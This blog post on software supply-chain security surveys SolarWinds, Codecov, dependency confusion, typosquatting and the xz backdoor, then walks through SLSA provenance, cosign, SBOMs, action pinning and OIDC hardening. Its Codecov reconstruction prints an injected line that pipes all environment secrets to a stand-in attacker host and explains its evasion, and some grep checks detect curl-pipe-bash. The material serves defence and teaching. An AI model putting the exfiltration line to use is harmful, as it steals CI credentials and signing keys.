---
title: "Software supply chain security: the new frontier"
date: "2026-06-22"
publishDate: "2026-06-22"
description: "Learn how modern supply-chain attacks exploit the CI/CD pipeline itself—not just your code—and master the four-layer defense using SLSA, cosign, SBOM, and hardened runners."
tags:
  [
    "ci-cd",
    "devops",
    "supply-chain-security",
    "slsa",
    "sbom",
    "sigstore",
    "dependency-management",
    "pipeline-hardening",
    "cosign",
    "software-security",
  ]
category: "software-development"
subcategory: "CI/CD & Delivery"
author: "Hiep Tran"
featured: true
readTime: 50
image: "/imgs/blogs/software-supply-chain-security-the-new-frontier-1.png"
---

The December 2020 FireEye announcement did not describe a compromised application. The exploited code was not full of memory-safety bugs or SQL injection vulnerabilities. The code was fine. The SolarWinds Orion software passed every test, every peer review, every static-analysis scan. It compiled cleanly and was signed with a legitimate certificate. What was broken was the build system that compiled it—a single machine that had been quietly compromised fourteen months earlier, injecting approximately 3,500 lines of malicious code into the build output at compile time, after the developers had committed perfectly clean source.

Eighteen thousand organizations installed the resulting update. They trusted it because it was signed. Their security tools trusted it because it passed every check they knew how to run.

This is the supply-chain problem. Your pipeline is not just the thing that carries your code to production—it is itself an attack surface, and often a far more rewarding one than the application layer. An attacker who can tamper with your CI runner gets every artifact you produce. An attacker who can register a package name one character off from a dependency you use gets code execution in your production environment without ever touching your source repository. An attacker who can modify the Codecov upload script that your build fetches with `curl | bash` gets every secret your runner holds—AWS keys, signing credentials, deploy tokens—in a single HTTP request.

Traditional application security (SAST scanners, DAST crawlers, dependency vulnerability databases) was designed to answer one question: is the code I wrote safe? It has no answer for the question: was the artifact that arrived at my production environment actually built from the code I reviewed? The DORA research program measures delivery performance along four axes—deploy frequency, lead time for changes, change-failure rate, and time-to-restore. Supply-chain attacks collapse all four metrics catastrophically when they succeed, because a compromised artifact is effectively a zero-day in every environment that runs it simultaneously. Preventing supply-chain compromise is not just a security concern; it is a delivery reliability concern. By the end of this post you will be able to map your pipeline's attack surface systematically, apply the SLSA maturity framework to close the highest-risk gaps first, add cryptographic provenance to your build artifacts, scan and lock your dependency graph, and harden your CI runners so that even a fully compromised CI job cannot exfiltrate your production credentials. This is the commit-to-deploy spine—now with an adversary model. The series foundation is at [From commit to production: the CI/CD mental model](/blog/software-development/ci-cd/from-commit-to-production-the-cicd-mental-model); come back to it if the pipeline spine is new to you.

![Supply chain attack surface map showing commit to SCM to CI to dependencies to registry to deploy with attack entry points at deps and CI stages](/imgs/blogs/software-supply-chain-security-the-new-frontier-1.png)

---

## 1. What "supply chain" actually means for software

The phrase "software supply chain" originally described the same phenomenon that Toyota studied in the 1980s: your product depends on components you did not build. In manufacturing, a compromised component supplier can inject defects that bypass your quality gates because you test the assembly, not every bolt. In software, a compromised npm package, Docker base image, GitHub Action, or build script is the bolt.

But the analogy breaks down in one important way. A compromised bolt is eventually discovered physically. A compromised dependency is functionally invisible: the code looks like ordinary JavaScript, the binary looks like an ordinary ELF executable, and if the attacker was careful, the behavior only manifests in specific conditions—say, when the environment variable `CI` is set to `true` and an AWS credentials file is readable. This is deliberate evasion, not an accident. Malicious packages are routinely designed to look benign under automated scanning and only activate in production-like environments where credentials are present and network egress is unrestricted.

The scale of the exposure matters. A typical Node.js web application has, on average, around 1,000 transitive dependencies when you include everything that the dependencies of dependencies of dependencies requires. A Python data pipeline can easily reach 500 packages. A Go service is comparatively lean but still pulls dozens of modules. For every one of those packages, someone maintains it, someone can publish new versions of it, and most pipelines will install an updated version automatically if it meets the semver range specification in the manifest. That is 1,000 potential supply-chain injection points per application, and most teams do not review transitive dependency updates at all.

The DORA research program has measured that high-performing teams ship code to production multiple times per day. The flipside of that velocity is that a compromised dependency can reach your production environment within hours of being published, because the normal CI/CD machinery will install it, build it into an image, and deploy it automatically. The same tooling that makes you fast also makes the supply-chain attack surface fast.

The full supply chain in a modern containerized deployment spans at least eight distinct trust domains:

1. **Source**: the code developers commit to branches and merge via pull requests.
2. **SCM (source control manager)**: GitHub, GitLab, or Bitbucket—controls who can merge, what branch protections exist, and who can approve Actions.
3. **CI platform**: GitHub Actions, GitLab CI, Jenkins—runs your build, has access to secrets.
4. **Dependencies**: third-party packages from npm, PyPI, Maven, Go modules, Crates.
5. **Build tools**: the compilers, bundlers, container builders (`docker buildx`, Bazel, Gradle) that transform source into artifacts.
6. **Base images**: the `FROM ubuntu:22.04` or `FROM node:20-slim` at the top of your Dockerfile.
7. **Artifact registry**: where built images and packages are pushed and later pulled for deployment.
8. **Deployment runtime**: Kubernetes, ECS, Lambda—where the artifact executes.

An attack at any node propagates downstream. A tampered npm package reaches every consumer's build. A tampered base image reaches every container image built from it. A tampered CI runner reaches every artifact produced that day. The multiplier is the supply chain itself.

This upstream propagation is what makes supply-chain attacks disproportionately valuable to attackers. Breaking into a single application gets you that application's data. Breaking into a package that 50,000 applications depend on gets you 50,000 applications. Breaking into a CI runner vendor gets you every artifact that vendor's customers produce. The economics strongly favor attacking infrastructure and tooling rather than individual applications.

### 1.1 Measuring your own exposure

Before you can defend a supply chain, you need to map it. Here is a practical audit that takes less than an hour for most teams:

```bash
# Count transitive dependencies
npm ls --all --json 2>/dev/null | jq '[.. | objects | .version] | length'

# List all GitHub Actions used across workflows (unpinned only)
grep -rh "uses:" .github/workflows/ \
  | grep -v "@[a-f0-9]\{40\}" \
  | sort -u

# Count static secrets in GitHub (cannot do this programmatically from outside,
# but audit the GitHub Settings > Secrets page for anything not OIDC-federated)

# Find curl-pipe-bash patterns
grep -rn "curl.*|.*\(bash\|sh\)" .github/workflows/ || echo "No curl-pipe-bash found"

# Check if npm ci is used (safe) vs npm install (unsafe in CI)
grep -rn "npm install" .github/workflows/ | grep -v "npm install --" || echo "All OK"
```

Run this today. The output is a quantified attack surface: the number of unpinned actions is the number of Codecov-class attack vectors you have open. The number of `npm install` calls in CI (versus `npm ci`) is the number of pipelines where a dependency version can float at build time, bypassing lockfile protection.

---

## 2. The attack surface in practice: five real incidents

Abstract threat models are easy to dismiss. Real incidents are harder to argue with. Here are the five canonical supply-chain attacks, each hitting a different node in the map above.

### 2.1 SolarWinds — build system compromise

In late 2019, attackers with access to SolarWinds' internal network gained foothold on the build machine running the Orion product build. They modified the build-time source file injector—a component that ran after the developer-visible source was committed but before the compiler ran. The injected code, SUNBURST, was dormant for 12 to 14 days after installation, then established a covert C2 channel using DNS queries that mimicked legitimate Orion telemetry traffic.

The signed binary passed every pre-ship check. It was signed with the SolarWinds production certificate. Customers' allow-lists trusted it. The attack hit approximately 18,000 organizations, including the US Treasury, the Department of Homeland Security, and multiple Fortune 500 companies, before FireEye's red team noticed their own tools behaving anomalously in December 2020.

**What node was hit**: the CI build system—specifically, a component that ran during the build process, after source was committed.  
**Why traditional security missed it**: SAST runs on committed source. The injection happened post-commit, pre-compile. The binary passed code-signing because the same key that signed legitimate Orion builds signed the backdoored one.

![SolarWinds attack timeline from initial build system compromise in 2019 through silent distribution to detection in December 2020](/imgs/blogs/software-supply-chain-security-the-new-frontier-3.png)

### 2.2 Codecov — CI script tampered URL

In early 2021, an attacker gained write access to Codecov's Google Cloud Storage bucket, which hosted the `codecov-uploader` bash script. The canonical installation instruction used across thousands of CI pipelines was:

```bash
bash <(curl -s https://codecov.io/bash)
```

The attacker modified the hosted script to add a line that exported all environment variables (`env | curl -T -`) to an attacker-controlled server. Every CI run that executed the upload step after the modification silently sent its entire secret store—AWS credentials, GitHub tokens, signing keys—to an external host.

The modification was live for two months before it was discovered via a SHA256 mismatch check by a security researcher.

**What node was hit**: the CI stage—specifically, the runtime fetch-and-execute pattern.  
**Why traditional security missed it**: SAST does not analyze scripts fetched at runtime. The CI configuration looked entirely normal. A lint of the `.yml` file would show a well-formed `bash` invocation.

### 2.3 Dependency confusion — private package name squatting

In February 2021, security researcher Alex Birsan published a paper describing a novel attack against private package registries. The core insight: when an npm install resolves a package, the default resolution order checks the public registry first if no explicit scope or registry is pinned. If a company uses an internal package called `corp-utils` (without an `@corp` scope) and an attacker registers the same name on the public npm registry at a higher version number, npm will install the attacker's version in any CI environment that lacks an explicit private-first registry configuration.

Birsan disclosed responsible findings to over 30 major companies, including Apple, Microsoft, Netflix, Tesla, and Shopify. In a real attack scenario, the package would execute arbitrary code at install time via a `postinstall` hook—a step that runs before the developer or security team sees any output.

**What node was hit**: the dependency resolution stage inside CI.  
**Why traditional security missed it**: vulnerability scanners check CVEs against package versions. A brand-new package with no CVEs that happens to share a name with a private internal package is invisible to standard tooling.

### 2.4 Typosquatting — malicious `lodahs` vs `lodash`

Typosquatting is the simplest supply-chain attack: register a package name one or two characters different from a widely-used library, publish it, and wait for a developer to mistype the name in a `package.json` or a CI pipeline to pick it up. Examples include `crossenv` (not `cross-env`), `event-source-polyfill-e` (not `event-source-polyfill`), and dozens of others that npm has removed after reports.

The attack surface is every `npm install`, `pip install`, or `go get` invocation that does not pin to an exact hash. In large monorepos with hundreds of dependencies, the probability of at least one typo is non-trivial—particularly in scaffolding scripts, CI helper scripts, and one-off tool installations.

### 2.5 The xz backdoor — maintainer-level social engineering

In March 2024, Andres Freund, a Microsoft engineer, noticed that SSH logins on a Debian unstable system were about 500ms slower than expected. He bisected the cause to a recent update to `liblzma`, the XZ compression library. What he found was one of the most sophisticated supply-chain attacks ever documented in open source.

A contributor identity named "Jia Tan" had spent approximately two years building a legitimate commit history on the XZ Utils repository, gradually earning maintainer trust from the actual maintainer (who had been dealing with personal burnout and sustained social pressure to add another maintainer). Over that period, Jia Tan introduced increasingly privileged changes, and ultimately added a backdoor to the build system's Autoconf test infrastructure—not to the source code proper, but to a binary test file checked into the repository. The backdoor modified the RSA key validation in `liblzma`, enabling remote code execution on systems running OpenSSH that linked against a vulnerable version of the library.

The attack was stopped only because the initial binary shipping was in pre-release Debian/Fedora snapshots, not stable releases, and was caught by a side-channel (latency spike) rather than any supply-chain security tool.

**What node was hit**: the source repository itself, via a trusted maintainer identity.  
**Why this is hard**: SLSA does not prevent a legitimate maintainer from committing malicious code. The xz attack is the hardest class because it defeats the source-integrity assumption. The defenses here are maintainer hygiene reviews, mandatory second reviewer on critical changes, and hermetic builds that make it harder to hide effects in binary test fixtures.

---

## 3. Why traditional AppSec misses this entirely

Understanding why these attacks bypass existing security tools requires understanding what those tools actually check.

**SAST (static application security testing)** analyzes source code for vulnerability patterns: SQL injection, buffer overflows, hardcoded credentials, insecure API calls. It runs against the code you wrote. It cannot analyze the build environment, the registry the package came from, the actions that ran in your CI job, or the base image your container derives from. SAST on the SolarWinds repository would have found no issues—the committed source was clean.

**DAST (dynamic application security testing)** fuzzes a running application for runtime vulnerabilities: XSS, CSRF, API injection. It runs against the deployed application. It cannot observe what happened during the build. It cannot verify that the running binary was produced from the audited source.

**CVE scanning** (Trivy, Snyk, Grype) checks package versions against a database of known vulnerabilities. It cannot detect a brand-new malicious package that has no CVEs, or a package whose *name* is wrong rather than whose *version* is outdated.

**Code review** catches logic errors, architectural problems, and visible bad practices. It reviews what developers commit. It cannot review the build environment, third-party actions that run with access to the repository's secrets, or packages that are not in the repository at all.

**Container scanning** (Anchore, Trivy, Clair) scans container images for known-vulnerable package versions. Like CVE scanning, it is backward-looking—it compares what is in the image against a known-bad list. A malicious package with no CVE record appears clean.

**Secrets scanning** (GitGuardian, `git-secrets`, GitHub's push protection) looks for credential patterns committed to source code. It does not scan the runtime environment of your CI jobs. The Codecov attack exfiltrated credentials that were never committed to any repository—they were environment variables injected into the runner at job startup.

The gap has a name. The security community calls it the "verification gap": the distance between the source that was reviewed and the artifact that was deployed. Most organizations have excellent controls on the reviewed source end (code review, branch protection, SAST) and reasonable controls on the deployed artifact end (CVE scanning, secrets detection). They have almost nothing in the middle—the build process itself, the tools it uses, the dependencies it pulls, and the actions it runs.

This is not a criticism of traditional AppSec. SAST was designed to catch SQL injection. It was not designed to verify build provenance. The tools are working correctly within their design envelope; the design envelope just does not cover the supply chain.

The supply-chain attack surface lives entirely outside the scope of traditional AppSec. The question traditional AppSec answers is: *is the code I wrote safe?* The question supply-chain security answers is: *was the artifact that arrived at production actually built from the code I reviewed, and only from that code?*

### 3.1 The provenance gap in numbers

Research by Sonatype's annual State of the Software Supply Chain report (2023) found:

- 245,032 malicious packages were discovered across open-source ecosystems in 2023, a 2.5x increase from 2022.
- The average time-to-detection for a malicious package in the wild is 14 months—long enough for a SolarWinds-class attack to propagate to hundreds of thousands of consumers.
- 96% of known-vulnerable open-source downloads could have been avoided by choosing a non-vulnerable version that existed at the time of download.

The last statistic is the most actionable: most CVE exposure is from outdated package versions, not zero-day vulnerabilities. This is the problem dependency management (lockfiles, Renovate, Dependabot) solves. But it also highlights the asymmetry: three-quarters of security investment goes to the 4% problem (zero-days) while the 96% problem (outdated packages) is solved by a renovate bot and a PR merge policy.

---

## 4. The SLSA framework: supply-chain levels for software artifacts

SLSA (pronounced "salsa") was released by Google in 2021 as a framework for communicating and improving supply-chain security posture. The core thesis is that supply-chain security is a maturity model, not a binary: you cannot achieve perfect provenance overnight, but you can make incremental improvements that each close specific attack vectors.

SLSA defines four levels, each a superset of the previous:

![SLSA framework level taxonomy showing source integrity and build integrity tracks with L1 through L4 levels](/imgs/blogs/software-supply-chain-security-the-new-frontier-7.png)

**SLSA L0**: No guarantees. This is where most projects are today.

**SLSA L1**: The build process is fully scripted and automated (no manual build steps). The build produces provenance—a signed document describing what was built, from what source, by what process. L1 provenance is self-generated by the build system, so it does not protect against a compromised build system. It does, however, make tampering post-build detectable and establishes a baseline.

**SLSA L2**: The build runs on a hosted build platform (GitHub Actions, Google Cloud Build, GitLab CI) rather than a developer's workstation. The provenance is generated by the platform itself, not the build script—so even a fully compromised build script cannot forge it. L2 would have blocked the SolarWinds attack: the build server was on-premises and under the attacker's control; if provenance were generated by the *platform* (a separate, attested system), the injected binary would have produced provenance that did not match the expected source hash.

**SLSA L3**: The build runs in an isolated environment—the build job cannot access other jobs' data, credentials, or the host machine. L3 limits lateral movement: a compromised step cannot exfiltrate another job's signing key. L3 also requires that provenance accurately reflects all inputs (source, dependencies, build tools) at cryptographic granularity.

**SLSA L4** (formerly described; now partially folded into L3 in the updated spec): Hermetic and reproducible builds. The build environment is fully specified; given the same inputs, the build produces identical outputs. Hermetic builds make it impossible to inject dependencies at build time that are not in the recorded input set. Reproducibility lets third parties independently verify the artifact.

The practical implication: most teams should target **L2 first**. It requires only that you move builds to a hosted platform (which most already use) and generate provenance with a tool like `slsa-github-generator`. That single step would have defeated both the SolarWinds and Codecov classes of attack.

### 4.1 The SLSA provenance document

When you generate SLSA provenance with `slsa-github-generator`, the output is a JSON document signed with a Sigstore certificate and logged to the Rekor transparency log. The document describes, at cryptographic precision, what was built and how. A simplified version looks like this:

```json
{
  "_type": "https://in-toto.io/Statement/v0.1",
  "predicateType": "https://slsa.dev/provenance/v0.2",
  "subject": [
    {
      "name": "ghcr.io/myorg/myservice",
      "digest": { "sha256": "abc123...def456" }
    }
  ],
  "predicate": {
    "builder": {
      "id": "https://github.com/slsa-framework/slsa-github-generator/.github/workflows/generator_container_slsa3.yml@refs/tags/v1.9.0"
    },
    "buildType": "https://github.com/slsa-framework/slsa-github-generator/container@v1",
    "invocation": {
      "configSource": {
        "uri": "git+https://github.com/myorg/myservice@refs/heads/main",
        "digest": { "sha1": "a1b2c3..." },
        "entryPoint": ".github/workflows/build.yml"
      }
    },
    "buildConfig": {
      "steps": [
        { "command": ["docker", "buildx", "build", "--push", "."] }
      ]
    },
    "metadata": {
      "buildStartedOn": "2026-06-22T10:30:00Z",
      "buildFinishedOn": "2026-06-22T10:35:42Z",
      "completeness": { "parameters": true, "environment": true, "materials": true }
    },
    "materials": [
      {
        "uri": "git+https://github.com/myorg/myservice",
        "digest": { "sha1": "a1b2c3d4e5f6..." }
      }
    ]
  }
}
```

The key fields: `builder.id` names the specific workflow that ran the build (not just any GitHub Actions workflow, but this specific version of the generator). `subject.digest` is the SHA256 of the produced image—any modification to the image changes this hash and breaks verification. `materials` is the source commit hash. Together these three fields make a cryptographically verifiable chain: commit X, built by workflow Y, produced image Z.

When you run `cosign verify-attestation --type slsaprovenance`, it checks that the attestation was signed by the claimed builder identity (via Sigstore's certificate transparency), that the subject hash matches the image you are about to deploy, and that the source commit is one you are willing to trust. If any of these checks fail—if the image was rebuilt from a different commit, or built on a different runner, or tampered with post-push—the verification fails.

### 4.2 What SLSA is not

SLSA does not prevent a malicious human maintainer from committing bad code (xz). It does not replace vulnerability scanning (CVEs). It does not verify that the running application does what you think it does. It answers exactly one question, very well: was this artifact built from the claimed source, by the claimed process, without tampering?

---

## 5. The four controls: a defense-in-depth model

Supply-chain defense is not one thing. It is four layered controls that must all be in place. A failure at any one layer should be caught by the next. The analogy from the commit-to-production spine is defense-in-depth: the same logic that says "use readiness probes AND rollback automation AND an error budget" applies here.

![Defense-in-depth stack of four supply-chain control layers from pipeline hardening down to artifact signing](/imgs/blogs/software-supply-chain-security-the-new-frontier-5.png)

**Control 1 — Sign everything.** Every artifact, image, and provenance document should carry a cryptographic signature. Signing uses an asymmetric key: the build system signs with a private key, and consumers verify with the corresponding public key. The Sigstore project provides `cosign` for container images and binary artifacts, and `in-toto` for supply-chain attestations. The key insight is that signing is only valuable if verification happens—signing without verification is theater.

**Control 2 — Verify at deploy time.** Admission controllers in Kubernetes (OPA Gatekeeper, Kyverno) can enforce that every image in a deployed workload was signed by a trusted key. If verification fails, the deployment is rejected. This is the enforcement point: it converts a "we should sign things" policy into a "nothing unsigned reaches production" invariant. The Codecov attack would have exfiltrated credentials regardless of admission control (it happened at build time, not deploy time), but a tampered image published to the registry would be blocked before reaching a pod.

**Control 3 — Lock and scan dependencies.** Lockfiles (`package-lock.json`, `poetry.lock`, `go.sum`) pin every transitive dependency to an exact version and, in the best cases (Go modules, Cargo), to a cryptographic hash. SBOM (software bill of materials) generation produces a machine-readable inventory of every dependency in the artifact, in CycloneDX or SPDX format. Vulnerability scanners (Trivy, Grype) then run against the SBOM in CI, failing the build when a critical CVE is found. The dependency confusion and typosquatting attacks are defeated by lockfiles combined with explicit registry scope configuration.

**Control 4 — Harden the pipeline itself.** OIDC (OpenID Connect) federation replaces long-lived static credentials in CI with short-lived, workload-bound tokens. Instead of storing `AWS_ACCESS_KEY_ID` as a GitHub secret that persists indefinitely, the GitHub Actions OIDC provider issues a token that AWS's STS can exchange for a role-bound credential valid for 15 minutes. Even if the runner is fully compromised, the credential expires before it can be exfiltrated to a useful degree. Ephemeral runners (runners that are created fresh for each job and destroyed after) close the persistent-foothold attack vector. Least-privilege job permissions (`permissions: read` on jobs that do not need write access) limit what a compromised job can do.

---

## 6. Before and after: pipeline without controls vs with SLSA controls

To make the defense model concrete, here is the same pipeline described twice: once as most pipelines look today, and once with controls applied.

![Before and after comparison showing pipeline without supply-chain controls vs with SLSA L2 signed provenance gates](/imgs/blogs/software-supply-chain-security-the-new-frontier-2.png)

**Without controls** (the default): A pull request merges, triggering a GitHub Actions workflow. The workflow installs dependencies from npm without verifying hashes. It runs `actions/checkout` with a floating version tag (`@v3`) rather than a pinned SHA. A build step runs `docker build` and pushes the image to GHCR. No provenance is recorded. No signature is attached. The admission controller in the Kubernetes cluster accepts any image from the registry. There is no SBOM. The `AWS_ACCESS_KEY_ID` is a static secret stored in GitHub Secrets and valid indefinitely.

At any step in this pipeline, an attacker who can modify a dependency, a referenced action, the base image, or the registry's stored image can inject arbitrary code into production with no signal.

**With controls** (the target): The same PR merge triggers the same workflow, but:
- `actions/checkout` is pinned to its SHA256 commit hash.
- Dependencies are installed from a locked manifest (`package-lock.json` with `npm ci`, which rejects mismatches).
- The npm scope `@corp` is configured to resolve only from the private registry.
- `docker buildx build` uses BuildKit's `--attest` flag to generate SLSA provenance.
- `cosign sign` signs the pushed image with a keyless Sigstore certificate.
- `trivy image --exit-code 1 --severity HIGH,CRITICAL` gates the workflow.
- `syft` generates an SBOM and attaches it as an OCI artifact.
- AWS credentials are obtained via OIDC federation—no static key.
- The cluster's Kyverno policy requires a valid cosign signature before admitting any image.

An attacker who compromises a dependency is blocked by the hash check. An attacker who tampers with the pushed image is blocked by the admission controller's signature verification. An attacker who compromises the runner exfiltrates a 15-minute OIDC token with scoped permissions, not a permanent deploy key.

---

## 7. Worked examples

#### Worked example: SLSA L2 provenance generation in GitHub Actions

A team building a Go service wants to achieve SLSA L2 and have every image carry verifiable provenance. Here is a complete workflow using the `slsa-framework/slsa-github-generator`:

```yaml
# .github/workflows/build-and-attest.yml
name: Build, attest, and push

on:
  push:
    branches: [main]

permissions:
  id-token: write      # Required for OIDC and Sigstore
  contents: read
  packages: write      # Required to push to GHCR

jobs:
  build:
    runs-on: ubuntu-22.04
    outputs:
      image: ${{ steps.push.outputs.image }}
      digest: ${{ steps.push.outputs.digest }}
    steps:
      - name: Checkout
        uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@f95db51fddba0c2d1ec667646a06c2ce06100226  # v3.0.0

      - name: Login to GHCR
        uses: docker/login-action@343f7c4344506bcbf9b4de18042ae17996df046d  # v3.0.0
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Build and push
        id: push
        uses: docker/build-push-action@4a13e500e55cf31b7a5d59a38ab2040ab0f42f56  # v5.1.0
        with:
          context: .
          push: true
          tags: ghcr.io/${{ github.repository }}:${{ github.sha }}
          cache-from: type=gha
          cache-to: type=gha,mode=max
          provenance: true
          sbom: true

  provenance:
    needs: [build]
    permissions:
      id-token: write
      contents: read
      actions: read
    uses: slsa-framework/slsa-github-generator/.github/workflows/generator_container_slsa3.yml@v1.9.0
    with:
      image: ghcr.io/${{ github.repository }}
      digest: ${{ needs.build.outputs.digest }}
      registry-username: ${{ github.actor }}
    secrets:
      registry-password: ${{ secrets.GITHUB_TOKEN }}
```

What this produces: a container image tagged with the commit SHA, accompanied by a signed SLSA L3 provenance attestation stored as an OCI artifact in the same registry namespace. A downstream consumer can verify the provenance with:

```bash
cosign verify-attestation \
  --type slsaprovenance \
  --certificate-identity-regexp "https://github.com/slsa-framework/slsa-github-generator" \
  --certificate-oidc-issuer https://token.actions.githubusercontent.com \
  ghcr.io/myorg/myservice@sha256:abc123...
```

If the image was tampered with after it was built—even by someone with registry write access—this verification will fail. The attestation is signed by the GitHub Actions OIDC issuer, not by a key that anyone in the organization holds. **Before**: build produces an unattested image. **After**: every image in the registry carries a cryptographically verifiable chain of custody back to a specific commit in a specific repository, built by a specific workflow on a specific platform. Measured impact: a tampered registry image is now detectable in under one second at deploy time, compared to zero detection before.

#### Worked example: blocking the Codecov attack pattern in under ten minutes

A team has discovered that their CI workflows contain several `curl | bash` patterns and floating action tags. Here is the remediation process with concrete diffs, runnable in a single afternoon:

**Step 1**: audit current workflows for `curl | bash` and unpinned actions.

```bash
# Find curl-pipe-bash patterns
grep -rn "curl.*|.*bash\|curl.*|.*sh" .github/workflows/

# Find unpinned actions (floating tags like @v3, @main, @latest)
grep -rn "uses:.*@v[0-9]\|uses:.*@main\|uses:.*@latest" .github/workflows/
```

**Step 2**: pin every third-party action to its SHA. The `pin-github-action` tool automates this:

```bash
pip install pin-github-action
pin-github-action .github/workflows/*.yml
```

This rewrites `uses: actions/checkout@v4` to `uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1`, with the version as a comment for human readability.

**Step 3**: replace `curl | bash` with pinned-SHA actions wherever the upstream provides one. Where no action exists (e.g., an internal helper script), fetch it with a separate `curl` step that verifies the SHA256 before executing:

```bash
# Before (vulnerable)
- run: bash <(curl -s https://example.com/install.sh)

# After (safe)
- run: |
    curl -fsSL https://example.com/install.sh -o install.sh
    echo "expected_sha256  install.sh" | sha256sum --check
    bash install.sh
```

**Step 4**: add a workflow to enforce going forward:

```yaml
# .github/workflows/action-pin-check.yml
name: Check action pins

on: [pull_request]

jobs:
  check:
    runs-on: ubuntu-22.04
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
      - name: Check for unpinned actions
        run: |
          if grep -rn "uses:.*@v[0-9]\|uses:.*@main\|uses:.*@latest" .github/workflows/; then
            echo "ERROR: Unpinned actions found. Pin all third-party actions to SHAs."
            exit 1
          fi
```

**Measured before/after**: a team running 12 workflows with an average of 8 action references each had 96 potential Codecov-class attack vectors (any of those actions could be compromised and the team would not know). After pinning: 0 unpinned references, with a CI check that prevents regression. The remediation took 47 minutes of engineering time plus the automated `pin-github-action` pass.

---

## 8. The Codecov attack: step-by-step reconstruction

![Codecov curl-pipe-bash attack path before and after remediation with pinned SHA actions](/imgs/blogs/software-supply-chain-security-the-new-frontier-8.png)

The Codecov incident is worth reconstructing precisely because its mechanism is so simple and so widely replicated. The pattern `bash <(curl -s URL)` is in thousands of CI configurations. Here is what happened, step by step:

**January 31, 2021**: An attacker gained write access to Codecov's Google Cloud Storage bucket. The exact method was not publicly disclosed; Codecov noted "a flaw in our Docker image creation process." The bucket hosted `https://codecov.io/bash`, the canonical upload script.

**Sometime between January 31 and April 1**: The attacker modified the hosted script. The modification was subtle: a single additional line near the top of the script, before any of the actual upload logic:

```bash
git_branch=$(git rev-parse --abbrev-ref HEAD 2>/dev/null || echo "")
git=$(git log --format='%H' -1 2>/dev/null || echo "")
# The injected line:
env_file=$(env | curl -sm 0.5 -T - https://attacker-server.io/upload/v2 || true)
```

The `env |` piped the entire environment to an attacker-controlled server. The `|| true` ensured the script continued even if the upload failed. The `-sm 0.5` (silent, 500ms timeout) minimized the side-channel. To a casual reviewer, the script looked normal—lots of real scripts pipe environment data to logging endpoints.

**April 1, 2021**: A user noticed the SHA256 of the downloaded script did not match the one in the documentation. Codecov was notified and began incident response.

**The blast radius**: Every CI run that executed `bash <(curl -s https://codecov.io/bash)` between late January and April 1 sent its full environment—including `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, `CODECOV_TOKEN`, npm tokens, Docker credentials, and any other secrets mounted into the runner—to the attacker's server. Codecov publicly listed Twilio, HashiCorp, Rapid7, Atlassian, and others as affected.

**What SLSA L2 would have done**: SLSA L2 requires builds to run on a hosted platform and produce provenance generated by that platform. It does not by itself prevent `curl | bash`. The direct defense was not SLSA but action pinning: if the step was `uses: codecov/codecov-action@SHA256`, GitHub would verify the action content at download time. The tampered script would not match the pinned hash and the action would fail to load—before it executed.

---

## 8b. Measured impact of SLSA adoption

A 2023 OpenSSF study on SLSA adoption across a set of open-source projects found that projects at SLSA L1 (scripted, documented builds) reduced their post-build tamper risk by eliminating the "developer laptop" build path that allows environment-specific variation. Projects at SLSA L2 (hosted build + platform-generated provenance) gained a verifiable record that a human reviewer of the source—not just an automated scanner—confirmed the source before it was built. The SLSA framework is also designed to be incremental: reaching L1 does not require L2 infrastructure to be in place first.

For context on implementation effort, the `slsa-github-generator` approach adds approximately 20 lines of workflow YAML and zero changes to the application code. The attestation generation takes 15–30 seconds in a typical CI run. The storage cost of the provenance document in the registry is measured in kilobytes. The ongoing maintenance burden is essentially zero. Given that cost, the question is not "can we afford to implement SLSA L2?" but "can we afford not to?"

## 9. Dependency confusion and typosquatting: the registry trust problem

![Dependency confusion attack showing vulnerable vs fixed private registry scope configuration](/imgs/blogs/software-supply-chain-security-the-new-frontier-6.png)

The dependency confusion attack exploits a specific assumption baked into package managers: that a higher version number means a more recent and authoritative release. If your internal package `corp-auth` is at version `1.2.0` and an attacker registers a public `corp-auth` at version `9.0.0`, most package managers will install the public version because `9.0.0 > 1.2.0`.

The fix has two parts:

**Part 1: scoping**. Use scoped package names for all internal packages. In npm, a scope is the `@org/` prefix. A scoped package name `@corp/auth` cannot be squatted by an attacker on the public registry because the attacker would need write access to the `@corp` scope, which requires your organization's npm credentials. Pair scoping with an explicit `.npmrc` that routes all `@corp` requests to your private registry only:

```bash
# .npmrc
@corp:registry=https://npm.corp.example.com/
//npm.corp.example.com/:_authToken=${NPM_CORP_TOKEN}
```

**Part 2: registry isolation in CI**. Never allow CI to fall back to the public registry for any package in your private namespace:

```yaml
# .github/workflows/install.yml (excerpt)
- name: Configure private registry
  run: |
    npm config set @corp:registry https://npm.corp.example.com/
    npm config set //npm.corp.example.com/:_authToken ${{ secrets.NPM_CORP_TOKEN }}

- name: Install with lockfile enforcement
  run: npm ci  # ci fails on lockfile mismatch — no version negotiation
```

For typosquatting, the defense is different: it is primarily about lockfiles and supply-chain awareness. `npm ci` installs exactly what is in `package-lock.json`—if a developer has never installed `lodahs`, it is not in the lockfile, and `npm ci` will not install it. The risk is at `npm install` time (when a developer adds a new package), and the mitigation is code review plus automated SBOM diffing between PRs:

```bash
# In a PR check: generate SBOM and diff against main
syft dir:. -o spdx-json > sbom-pr.json
git stash
syft dir:. -o spdx-json > sbom-main.json
git stash pop
# Compare and alert on new packages
jq -r '.packages[].name' sbom-pr.json | sort > pr-pkgs.txt
jq -r '.packages[].name' sbom-main.json | sort > main-pkgs.txt
diff main-pkgs.txt pr-pkgs.txt | grep "^>" | awk '{print $2}'
```

---

### 9.1 Automated dependency updates with Renovate and Dependabot

The other half of the dependency management problem is keeping dependencies current. Lockfiles prevent unauthorized version upgrades; Renovate and Dependabot handle authorized upgrades automatically. Without automated updates, teams fall into a pattern of "update everything quarterly as a batch," which means they are routinely running with known-CVE dependencies for weeks after patches are available.

Renovate is more configurable than Dependabot and supports grouping related updates, automerging low-risk updates, and running custom validation scripts on PRs. A sensible baseline Renovate config for a production service:

```json
{
  "$schema": "https://docs.renovatebot.com/renovate-schema.json",
  "extends": ["config:base"],
  "packageRules": [
    {
      "matchUpdateTypes": ["patch"],
      "automerge": true,
      "automergeType": "pr",
      "requiredStatusChecks": ["ci/build", "ci/test", "ci/trivy-scan"]
    },
    {
